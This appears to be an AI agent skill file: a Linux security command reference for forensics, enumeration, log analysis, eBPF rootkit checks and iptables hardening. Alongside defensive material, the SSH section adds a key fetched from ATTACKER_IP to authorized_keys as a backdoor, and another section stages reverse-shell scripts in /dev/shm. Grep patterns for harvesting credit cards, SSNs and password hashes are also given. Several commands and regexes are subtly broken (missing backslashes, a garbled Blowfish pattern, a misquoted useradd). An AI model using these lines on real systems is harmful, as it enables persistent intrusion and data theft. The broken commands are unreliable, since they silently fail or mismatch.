---
name: linux-security-commands
description: Essential Linux commands for security auditing, incident response, and system hardening. Use this skill whenever the user needs to: enumerate system vulnerabilities (SUID/SGID files, writable directories), analyze logs (journalctl, grep patterns), investigate network activity (lsof, iptables), extract sensitive data (passwords, hashes, emails, credit cards), work with eBPF programs, perform file forensics (base64, xxd, dd), or harden a Linux system. Trigger this for any Linux security task, penetration testing, blue team operations, or system administration involving command-line tools.
---

# Linux Security Commands Reference

A comprehensive collection of Linux commands for security professionals, incident responders, and system administrators.

## Quick Start

**What do you need to do?**
- 🔍 **Find vulnerabilities**: SUID/SGID files, writable directories, recent files
- 📊 **Analyze logs**: journalctl queries, grep patterns for sensitive data
- 🌐 **Network investigation**: lsof, iptables, nmap scripts
- 🔐 **Extract data**: passwords, hashes, emails, credit cards, SSNs
- 🛡️ **System hardening**: iptables rules, file permissions
- 🧪 **File forensics**: base64, xxd, dd, compression
- 🎯 **eBPF analysis**: bpftool for rootkit detection

## File Operations & Forensics

### Encoding/Decoding
```bash
# Base64 encode (no line wrapping)
base64 -w 0 file

# Base64 decode
echo "CIKUmMesGw==" | base64 -d

# Hex dump without newlines
xxd -p boot12.bin | tr -d '\n'

# Echo without newline
echo -n -e "string"
```

### File Counting & Sorting
```bash
# Count lines, characters, words
wc -l <file>      # Lines
wc -c <file>      # Characters
wc -w <file>      # Words

# Sort numerically (reverse)
sort -nr file

# Sort and remove duplicates
cat file | sort | uniq
```

### File Modification
```bash
# Replace string in file (in-place)
sed -i 's/OLD/NEW/g' path/file

# Set immutable bit (file cannot be modified/deleted)
sudo chattr +i file.txt
sudo chattr -i file.txt  # Remove immutable bit
```

### Binary Operations
```bash
# Copy file skipping first N bytes
dd if=file.bin bs=28 skip=1 of=blob

# Download to RAM (volatile, disappears on reboot)
wget URL -O /dev/shm/.rev.py
curl URL -o /dev/shm/shell.py
```

### Compression
```bash
# Extract archives
tar -xvzf file.tgz      # gzip
tar -xvjf file.tbz      # bzip2
gunzip file.gz
unzip file.zip
7z -x file.7z
unxz file.xz            # xz (install xz-utils first)

# Compress
bzip2 -d file.bz2       # Decompress bzip2
```

## Network Investigation

### Process Network Activity (lsof)
```bash
# All open files by any process
lsof

# Files used by specific process
lsof -p 3

# Network files only
lsof -i

# IPv4 network files
lsof -i 4

# IPv6 network files
lsof -i 6

# Specific process + IPv4
lsof -i 4 -a -p 1234

# Files in directory used by processes
lsof +D /lib

# Port 80 listeners
lsof -i :80

# Deleted but still open files
lsof +L1

# Alternative for deleted files
find /proc/[0-9]*/fd -lname '*deleted*' 2>/dev/null
```

### Process File Descriptors
```bash
# List FDs for a process
ls -l /proc/<PID>/fd

# Resolve what an FD points to
readlink /proc/<PID>/fd/<FD>

# Read through open FD (if permissions allow)
cat /proc/<PID>/fd/<FD>

# Check proc mount options (hidepid hardens visibility)
grep " /proc " /proc/mounts
```

### HTTP Servers
```bash
# Python 2
python -m SimpleHTTPServer 80

# Python 3
python3 -m http.server 80

# Ruby
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"

# PHP
php -S $ip:80
```

### Curl Operations
```bash
# POST JSON data
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"password":"password", "username":"admin"}' \
  http://host:3000/endpoint

# GET with JWT auth
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

# Download file
curl URL -o output_file
```

### SSH Key Operations
```bash
# Scan SSH keys from host (compare if multiple ports from same host)
ssh-keyscan 10.10.10.101

# Add public key to authorized_keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

### OpenSSL Commands
```bash
# Get certificate from server
openssl s_client -connect 10.10.10.127:443

# Read certificate
openssl x509 -in ca.cert.pem -text

# Generate RSA key
openssl genrsa -out newuser.key 2048

# Generate CSR from key
openssl req -new -key newuser.key -out newuser.csr

# Create self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Sign certificate with CA
openssl x509 -req -in newuser.csr \
  -CA intermediate.cert.pem \
  -CAkey intermediate.key.pem \
  -CAcreateserial \
  -out newuser.pem -days 1024 -sha256

# Create PKCS12 (for Firefox)
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem

# Decrypt encrypted SSH key
openssl rsa -in key.ssh.enc -out key.ssh

# Decrypt AES256 file
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
```

## Vulnerability Enumeration

### Find SUID/SGID Files
```bash
# SUID files (can be exploited for privilege escalation)
find / -perm /u=s -ls 2>/dev/null

# SGID files
find / -perm /g=s -ls 2>/dev/null
```

### Find Writable Directories
```bash
# Writable directories (depth 10)
find / -type d -maxdepth 10 -writable \
  -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r

# Owned by current user
find / -maxdepth 10 -user $(id -u) \
  -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r

# Owned by current group
find / -maxdepth 10 -group $(id -g) \
  -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r
```

### Find Recent Files
```bash
# Files modified between dates
find / -newermt 2018-12-12 ! -newermt 2018-12-14 \
  -type f -readable \
  -not -path "/proc/*" -not -path "/sys/*" \
  -ls 2>/dev/null

# Recent files (depth 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r | less

# Recent files only
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r | less

# Recent directories only
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r | less
```

### Find Readable Directories
```bash
# Readable directories (depth 4)
find / -type d -maxdepth 4 -readable \
  -printf "%T@ %Tc | %p \n" 2>/dev/null | \
  grep -v "| /proc" | grep -v "| /dev" | \
  grep -v "| /run" | grep -v "| /var/log" | \
  grep -v "| /boot" | grep -v "| /sys/" | \
  sort -n -r
```

## Data Extraction with Grep

### Extract Emails
```bash
# From single file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

# From all text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
```

### Extract IP Addresses
```bash
# Valid IPv4 addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt
```

### Extract Passwords & Credentials
```bash
# Password fields
grep -i "pwd\|passw" file.txt

# User/authentication mentions
grep -i "user\|invalid\|authentication\|login" file.txt
```

### Extract Hashes
```bash
# MD5 (32 hex chars)
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | \
  egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt

# SHA1 (40 hex chars)
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{40}([^a-fA-F0-9]|$)' *.txt | \
  egrep -o '[a-fA-F0-9]{40}' > sha1-hashes.txt

# SHA256 (64 hex chars)
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{64}([^a-fA-F0-9]|$)' *.txt | \
  egrep -o '[a-fA-F0-9]{64}' > sha256-hashes.txt

# SHA512 (128 hex chars)
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{128}([^a-fA-F0-9]|$)' *.txt | \
  egrep -o '[a-fA-F0-9]{128}' > sha512-hashes.txt

# MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt

# Blowfish hashes
grep -e "\$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt

# Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt

# VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt

# phpBB3-MD5
egrep -o '\$H\$S{31}' *.txt > phpBB3-md5.txt

# WordPress-MD5
egrep -o '\$P\$S{31}' *.txt > wordpress-md5.txt

# Drupal 7
egrep -o '\$S\$S{52}' *.txt > drupal-7.txt

# Old Unix-MD5
egrep -o '\$1\$w{8}S{22}' *.txt > md5-unix-old.txt

# MD5-apr1
egrep -o '\$apr1\$w{8}S{22}' *.txt > md5-apr1.txt

# SHA512crypt (Unix)
egrep -o '\$6\$w{8}S{86}' *.txt > sha512crypt.txt
```

### Extract URLs
```bash
# HTTP URLs
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt

# All URLs (HTTP, HTTPS, FTP, mailto)
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"\t]*|www.[-a-z0-9.]+)[^ .,;\t>">):]' *.txt > urls.txt

# For binary files, use:
tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex"
# or
cat -v *.log | egrep -o "Your_Regex"
```

### Extract Credit Cards
```bash
# Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt

# MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt

# American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt

# Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt

# Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt

# JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
```

### Extract Personal Identifiers
```bash
# Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt

# US Phone Numbers
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt

# US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt

# US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt

# Indiana Driver License
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt

# ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```

### Extract Numbers
```bash
# Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt
```

## Log Analysis (journalctl)

### Basic Queries
```bash
# List all boots with timestamps
journalctl --list-boots

# Previous boot, errors only
journalctl -b -1 -p err -o short-iso

# Specific time range
journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"

# Live tail with filter
journalctl -u ssh.service -f | grep "Failed password"

# Root user actions (last hour)
journalctl _UID=0 --output=json-pretty --since "1 hour ago"

# Check journal size
journalctl --disk-usage

# Export logs to file
journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs.log
```

### Cleanup (use carefully!)
```bash
# Vacuum journal (take evidence first!)
sudo journalctl --vacuum-size=1G --vacuum-time=7days
```

### Advanced Filters
```bash
# Case-sensitive grep
journalctl --grep 'Invalid user' --case-sensitive

# Kernel messages only
journalctl -k

# Stack filters: _PID, _SYSTEMD_UNIT, _HOSTNAME, _TRANSPORT
journalctl _PID=1234 _SYSTEMD_UNIT=nginx.service
```

## eBPF Analysis (Rootkit Detection)

Modern rootkits (TripleCross, BPFDoor) persist as hidden eBPF programs. Use these commands to detect them.

```bash
# List all eBPF programs, attach points, PIDs, map IDs
sudo bpftool prog

# Dump translated bytecode for program ID 835
sudo bpftool prog dump xlated id 835 | less

# List all maps
sudo bpftool map show

# Dump map contents (replace 104 with map ID)
sudo bpftool map dump id 104 | hexdump -C

# Check kernel eBPF feature support
sudo bpftool feature probe | less

# Real-time monitoring (TUI)
sudo ebpfmon
```

**What to look for:**
- Programs owned by unexpected PIDs
- Unexpected `xdp` or `kprobe` attachments
- Unsigned programs in production
- Covert sockets or credentials in map dumps

## Firewall (iptables)

### Reset Rules
```bash
# Flush all rules
iptables --flush

# Delete custom chains
iptables --delete-chain
```

### Basic Hardening
```bash
# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Drop ICMP (ping)
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

# Allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

# Allow SSH from specific subnet
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT

# Allow DNS
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

# Set default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```

## User Management

### Create User
```bash
# Add user with password hash
useradd -p 'openssl passwd -1 <Password>' username
```

### Clipboard Operations
```bash
# Copy file to clipboard (requires xclip)
xclip -sel c < file.txt
```

## System Utilities

### Timezone
```bash
# Reconfigure timezone
sudo dpkg-reconfigure tzdata
```

### Package Lookup
```bash
# Find which package owns a binary
apt-file search /usr/bin/file
# Install apt-file first: apt-get install apt-file
```

### Mount Virtual Disks
```bash
# Install tools
sudo apt-get install libguestfs-tools

# Mount VHD read-only
guestmount --add NAME.vhd --inspector --ro /mnt/vhd
# Create /mnt/vhd first if it doesn't exist
```

### Performance Counters
```bash
# Count instructions executed (requires host, not VM)
perf stat -x, -e instructions:u "ls"
```

### Protobuf Decode
```bash
# Decode protobuf message
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
```

### List ZIP Contents
```bash
7z l file.zip
```

## Nmap Script Discovery

```bash
# Find SMB-related scripts
nmap --script-help "(default or version) and *smb*"

# Alternative: search NSE files
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb

# Get help for specific script category
nmap --script-help "(default or version) and smb"
```

## Quick Reference: Common Patterns

| Task | Command |
|------|--------|
| Find SUID files | `find / -perm /u=s -ls 2>/dev/null` |
| Find writable dirs | `find / -type d -writable -maxdepth 10` |
| Extract emails | `grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file` |
| Extract IPs | `grep -E -o "(25[0-5]...){4}" file` |
| List network processes | `lsof -i` |
| View recent logs | `journalctl --since "1 hour ago"` |
| Base64 encode | `base64 -w 0 file` |
| Hex dump | `xxd -p file` |
| Check eBPF programs | `sudo bpftool prog` |

## Tips

1. **Always redirect errors**: Use `2>/dev/null` to suppress permission denied errors when searching
2. **Filter system paths**: Exclude `/proc`, `/sys`, `/dev`, `/run`, `/var/log`, `/boot` when searching
3. **Sort by time**: Use `-printf "%T@ %Tc | %p \n"` with `sort -n -r` for time-sorted results
4. **Use RAM for temp files**: `/dev/shm/` is volatile and disappears on reboot
5. **Take evidence before cleanup**: Always export logs before running `journalctl --vacuum`
6. **eBPF correlation**: Compare `bpftool prog` output with expected NIC/cgroup attachments
7. **Grep binary files**: Use `cat -v` or `tr` to convert binary before grepping

## References

- [eBPFmon: A new tool for exploring and interacting with eBPF applications](https://redcanary.com/blog/linux-security/ebpfmon/)
- [How to use the journalctl command to view Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
- [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
